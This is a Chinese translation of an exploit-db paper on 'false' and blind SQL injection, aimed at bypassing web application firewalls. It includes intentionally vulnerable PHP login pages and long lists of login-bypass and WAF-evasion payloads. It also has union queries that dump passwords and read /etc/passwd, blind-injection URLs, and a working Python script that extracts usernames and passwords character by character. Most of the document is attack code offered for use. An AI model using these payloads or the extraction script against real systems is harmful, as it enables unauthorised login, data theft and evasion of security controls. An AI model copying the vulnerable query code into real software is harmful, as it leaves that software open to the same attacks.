# False SQL Injection and Advanced Blind SQL Injection

0x00 背景
=======

* * *

原文地址：http://www.exploit-db.com/papers/18263/

这篇文章是为介绍一种新的绕过web防火墙或安全解决方案的SQL注入的方法而编写的。我（原文作者，下同）在一些韩国的防火墙上做了测试，大部分都能成功，我不会为减少影响而透露所测试的web防火墙的制造商。

阅读本文档之前你需要先了解基本的MySQL原理。我将“SQL注入”归类为两类。第一类是一般的SQL注入，即我们通常所说的“真SQL注入”，第二类是“假SQL注入”。在本文档中，你将了解到一些“真SQL注入”的特点。

0x01 准备
=======

* * *

我的方法（假SQL注入）与“盲注”中提到的真/假SQL注入的方法是真的不同的。测试的环境如下。

```
ubuntu server   11.04
mySQL       5.1.54-1
Apache      2.2.17
PHP     5.3.5-1

```

测试代码如下。

```
<?php

/*
create database injection_db;
use injection_db;
create table users(num int not null, id varchar(30) not null, password varchar(30) not null, primary key(num));

insert into users values(1, 'admin', 'ad1234');
insert into users values(2, 'wh1ant', 'wh1234');
insert into users values(3, 'secuholic', 'se1234');

*** login.php ***
*/

if(empty($_GET['id']) || empty($_GET['password'])){
  echo "<html>";
  echo "<body>";
  echo "<form name='text' action='login.php' method='get'>";
  echo "<h4>ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type='text' name='id'><br>";
  echo "PASS<input type='password' name='password'><br></h4>";
  echo "<input type='submit' value='Login'>";
  echo "</form>";
  echo "</body>";
  echo "</html>";
}

else{
  $id = $_GET['id'];
  $password = $_GET['password'];

  $dbhost = 'localhost';
  $dbuser = 'root';
  $dbpass = 'pass';
  $database = 'injection_db';

  $db = mySQL_connect($dbhost, $dbuser, $dbpass);
  mySQL_select_db($database,$db);
  $SQL = mySQL_query("select * from users where id='$id' and password='$password'") or die (mySQL_error());

  $row = mySQL_fetch_array($SQL);

  if($row[id] && $row[password]){
    echo "<font color=#FF0000><h1>"."Login sucess"."</h1></u><br>";
    echo "<h3><font color=#000000>"."Hello, "."</u>";
    echo "<font color=#D2691E>".$row[id]."</u></h3><br>";
  }
  else{
    echo "<script>alert('Login failed');</script>";
  }
  mySQL_close($db);
}

?>

```

首先，基本的SQL注入如下

```
' or 1=1#

The code above is general SQL Injection Code, and this writer classified the code as "True SQL Injection". When you log on to some site, in internal of web program, your id and password are identified by some statement used "select id, password from table where id='' and password='', you can easily understand when you think 0 about character single quotation mark. Empty space is same as 0, the attack is possible using = and 0. As a result, following statement enables log on process.

```

上面的代码是一般的SQL注入代码，我将这类代码归为“真SQL注入”。当你登录网站的时候，在网站的内部程序中，你的ID和密码会被一些语句用"select id, password from table where id='' and password=''"识别，如果你把单引号当做0你可以很容易地理解。空的空间与0是相等的，攻击可以使用‘=’和‘0’。这样一来，下面的语句就能完成登录过程。

```
'=0#

```

我们可以以不同的方式运用它。

因为0>-1，这一句也能成功。

```
'>-1#

```

同样的，因为0<1，所以这一句也能成功。

```
'<1#

```

你不必只使用单一的数字。你可以像下面一样使用两个数字攻击。

```
1'<99#

```

Comparison operation 0=1 will be 0, the following operation result is true because of id=''=0(0=1). 比较操作“0=1”的结果将会是0，又因为id=''=0，所以以下的操作结果是真。

```
'=0=1#

```

此外，还可以使用一些比较动作能使得两边的值相等。

```
'<=>0#

```

像这样，如果你使用比较操作，你可以用额外的方式进行攻击。

```
'=0=1=1=1=1=1#
'=1<>1#
'<>1#
1'<>99999#
'!=2!=3!=4#

```

0x02 不同的SQL操作
=============

* * *

现在，你将开始理解False SQL injection。以下为MySQ操作，不是攻击语句。

```
mySQL> select * from users;
+-----+-----------+----------+
| num | id        | password |
+-----+-----------+----------+
|   1 | admin     | ad1234   |
|   2 | wh1ant    | wh1234   |
|   3 | secuholic | se1234   |
+-----+-----------+----------+
3 rows in set (0.01 sec)

```

毫无疑问，它显示了所有表中的返回内容。 以下是当你不输入任何值在id字段时的返回内容。

```
mySQL> select * from users where id='';
Empty set (0.00 sec)

```

因为在id字段没有任何字符串，所以不会有返回结果。 事实上，从这里我已经看到，如果在MySQL字符串字段为0的情况下，返回结果始终为真。根据这个现象，以下语句结果为真。

```
mySQL> select * from users where id=0;
+-----+-----------+----------+
| num | id        | password |
+-----+-----------+----------+
|   1 | admin     | ad1234   |
|   2 | wh1ant    | wh1234   |
|   3 | secuholic | se1234   |
+-----+-----------+----------+
3 rows in set (0.00 sec)

```

如果你在ID中输入0，所有内容都将被显示。这就是假SQL注入的原理。无论如何，结果为0（真）将使得登录成功。为了使结果为0（真），你需要一些东西处理整数，如使用位操作和算术运算。

下面是使用位运算的例子。

或位运算为任何程序员所熟知。正如我之前告诉过你的，''等于0。如果你计算“0或0”，结果还是0. 所以下面的假SQL注入能成功登录。

```
'|0#

```

当然，你也可以使用和运算。

```
'&0#

```

这是使用异或运算的攻击方法

```
'^0#

```

同样可以使用移位操作。

```
'<<0#
'>>0#

```

如果你喜欢使用位操作，你可以使用多种不同的攻击方法。

```
'&''#
'%11&1#
'&1&1#
'|0&1#
'<<0|0#
'<<0>>0#

```

下面是使用算术运算的“假SQL注入”。 如果使用带有''的算术运算的结果为0，攻击将会成功。下面是一个使用算术运算的例子。

```
'*9#
乘法

'/9#
除法

'%9#
求余

'+0#
加法

'-0#
减法

```

关键点在于结果必须小于1。你也可以使用如下语句攻击。

```
'+2+5-7#
'+0+0-0#
'-0-0-0-0-0#
'*9*8*7*6*5#
'/2/3/4#
'%12%34%56%78#
'/**/+/**/0#
'-----0#
'+++0+++++0*0#

```

下一种攻击方法使用的是函数功能。在这篇文章中，我无法向你们展示所有的函数。这个攻击方式并不难，所以你们可以使用函数进行你们想要的真/假SQL攻击。而这种攻击是“真SQL注入”或是“假SQL注入”取决于函数返回后的最后一个操作。

```
'<hex(1)#
'=left(0x30,1)#
'=right(0,1)#
'!=curdate()#
'-reverse(0)#
'=ltrim(0)#
'<abs(1)#
'*round(1,1)#
'&left(0,0)#
'*round(0,1)*round(0,1)#

```

此外，您还可以将空格做为函数名进行攻击。但你只能在某些函数中使用空格。

```
'=upper     (0)#

```

这一次，SQL的关键字是方法。这种方法根据情况视作为真或假SQL注入。

```
' <1 and 1#
'xor 1#
'div 1#
'is not null#
admin' order by'
admin' group by'
'like 0#
'between 1 and 1#
'regexp 1#

```

在id或password区域中没有额外注释的很可能是真的假SQL注入。一般的web防火墙只过滤#, --, /**/,因此该方法在web防火墙中更有效。

```
ID  : '='
PASS: '='

ID  : '<>'1
PASS: '<>'1

ID  : '>1='
PASS: '>1='

ID  : 0'='0
PASS: 0'='0

ID  : '<1 and 1>'
PASS: '<1 and 1>'

ID  : '<>ifnull(1,2)='1
PASS: '<>ifnull(1,2)='1

ID  : '=round(0,1)='1
PASS: '=round(0,1)='1

ID  : '*0*'
PASS: '*0*'

ID  : '+'
PASS: '+'

ID  : '-'
PASS: '-'

ID  :'+1-1-'
PASS:'+1-1-'

```

使用文本的攻击比使用括号的攻击在绕过web防火墙时会更有效。

```
'+(0-0)#
'=0<>((reverse(1))-(reverse(1)))#
'<(8*7)*(6*5)*(4*3)#
'&(1+1)-2#
'>(0-100)#

```

0x03 绕过
=======

让我们来看看一般的SQL注入攻击。

```
' or 1=1#

```

如果被转换为16进制编码，将会是这样的。

```
http://127.0.0.1/login.php?id=%27%20%6f%72%20%31%3d%31%23&password=1234

```

像上面的攻击基本都会被过滤。因此它不是好的攻击方法，我将尝试使用tab(%09)代替空格绕过过滤器。事实上。你还可以使用%a0代替%09

也可以使用以下的值。

```
%09
%0a
%0b
%0c
%0d
%a0
%23%0a
%23%48%65%6c%6c%6f%20%77%6f%6c%72%64%0a

```

以下是使用％A0代替％20的例子。

```
http://127.0.0.1/login.php?id=%27%a0%6f%72%a0%31%3d%31%23&password=1234

```

这一次，我将展示盲注的攻击方法，这种攻击可以绕过web防火墙过滤器，但一些攻击者倾向于认为盲注不可能实现登录。所以我决定展示这个例子。

下面的攻击代码能被用来登录页面且页面将显示ID和密码

```
'union select 1,group_concat(password),3 from users#

```

这个攻击代码将显示/etc/password的内容。

```
'union select 1,load_file(0x2f6574632f706173737764),3 from users#

```

我敢说在盲注中不使用union select也是可以的。

记录的结果有三个。

```
admin' and (select count(*) from users)=3#

```

让我们使用盲注绕过web防火墙。以下是一份有存在盲注漏洞的代码

```
<?php

  /*** info.php ***/

  $n = $_GET['num'];
  if(empty($n)){
    $n = 1;
  }

  $dbhost = 'localhost';
  $dbuser = 'root';
  $dbpass = 'root';
  $database = 'injection_db';

  $db = mySQL_connect($host, $dbuser, $dbpass);
  mySQL_select_db($database,$db);
  $SQL = mySQL_query("select * from `users` where num=".$n) or die (mySQL_error());
  $info = @mySQL_fetch_row($SQL);
  echo "<body bgcolor=#000000>";
  echo "<h1><font color=#FFFFFF>wh1ant</font>";
  echo "<font color=#2BF70E> site for blind SQL injection test</h1><br>";
  echo "<h1><font color=#2BF70E>num: </font><font color=#D2691E>".$info[0]."</font></h1>";
  echo "<h1><font color=#2BF70E>user: </font><font color=#D2691E>".$info[1]."</font>";
  echo "<body>";
  mySQL_close($db);

?>

```

像上面那样的基本的盲注如下。

```
http://127.0.0.1/info.php?num=1 and 1=0
http://127.0.0.1/info.php?num=1 and 1=1

```

在Blind SQL Injection可以使用运算符=。

```
http://192.168.137.129/info.php?num=1=0
http://192.168.137.129/info.php?num=1=1

```

自然也能使用其它的运算符。

```
http://127.0.0.1/info.php?num=1<>0
http://127.0.0.1/info.php?num=1<>1

http://127.0.0.1/info.php?num=1<0
http://127.0.0.1/info.php?num=1<1

http://127.0.0.1/info.php?num=1*0*0*1
http://127.0.0.1/info.php?num=1*0*0*0

http://127.0.0.1/info.php?num=1%1%1%0
http://127.0.0.1/info.php?num=1%1%1%1

http://127.0.0.1/info.php?num=1 div 0
http://127.0.0.1/info.php?num=1 div 1

http://127.0.0.1/info.php?num=1 regexp 0
http://127.0.0.1/info.php?num=1 regexp 1

http://127.0.0.1/info.php?num=1^0
http://127.0.0.1/info.php?num=1^1

```

攻击示例：

```
http://127.0.0.1/info.php?num=0^(locate(0x61,(select id from users where num=1),1)=1)
http://127.0.0.1/info.php?num=0^(select position(0x61 in (select id from users where num=1))=1)
http://127.0.0.1/info.php?num=0^(reverse(reverse((select id from users where num=1)))=0x61646d696e)
http://127.0.0.1/info.php?num=0^(lcase((select id from users where num=1))=0x61646d696e)
http://127.0.0.1/info.php?num=0^((select id from users where num=1)=0x61646d696e)
http://127.0.0.1/info.php?num=0^(id regexp 0x61646d696e)
http://127.0.0.1/info.php?num=0^(id=0x61646d696e)
http://127.0.0.1/info.php?num=0^((select octet_length(id) from users where num=1)=5)
http://127.0.0.1/info.php?num=0^((select character_length(id) from users where num=1)=5)

If I will show all attack, I have to take much time, So I stopped in this time. Blind SQL Injection is difficult manually, So using tool will be more effective. I will show a tool made python, this is an example using ^(XOR) bitwise operation. In order to make the most of detouring the web firewall, I replaced space with %0a.

```

展示所有的攻击过程将会浪费我大量的时间，所以到此为止。手工盲注是很困难的，所以使用工具会更有效。下面是一个python写的工具，这是一个使用异或运算的例子。为了绕过大多数的web防火墙，我将空格换成了%0a。

```
### blind.py ###

import urllib
import sys
import os



def put_data(true_url, true_result, field, index, length):
    for i in range(1, length+1):
        for j in range(32, 127):
            attack_url = true_url + "^(%%a0locate%%a0%%a0(0x%x,(%%a0select%%a0%s%%a0%%a0from%%a0%%a0users%%a0where%%a0num=%d),%d)=%d)" % (j,field,index,i,i)
            attack_open = urllib.urlopen(attack_url)
            attack_result = attack_open.read()
            attack_open.close()

            if attack_result==true_result:
                ch = "%c" % j
                sys.stdout.write(ch)
                break
    print "\t\t",

def get_length(false_url, false_result, field, index):
    i=0
    while 1:
        data_length_url = false_url + "^(%%a0(select%%a0octet_length%%a0%%a0(%s)%%a0from%%a0users%%a0where%%a0num%%a0=%%a0%d)%%a0=%%a0%d)" % (field,index,i)
        data_length_open = urllib.urlopen(data_length_url)
        data_length_result = data_length_open.read()
        data_length_open.close()
        if data_length_result==false_result:
            return i
        i+=1

url = "http://127.0.0.1/info.php"

true_url = url + "?num=1"
true_open = urllib.urlopen(true_url)
true_result = true_open.read()
true_open.close()

false_url = url + "?num=0"
false_open = urllib.urlopen(false_url)
false_result = false_open.read()
false_open.close()


print "num\t\tid\t\tpassword"
fields = "num", "id", "password"

for i in range(1, 4):
    for j in range(0, 3):
        length = get_length(false_url, false_result, fields[j], i)
        length = put_data(false_url, true_result, fields[j], i, length)
    print ""

```

很遗憾，攻击测试很快就停止了。如果有人学过一些额外的攻击代码，他将很容易地升级攻击。

韩文原版http://wh1ant.kr/archives/[Hangul]%20False%20SQL%20injection%20and%20Advanced%20blind%20SQL%20injection.txt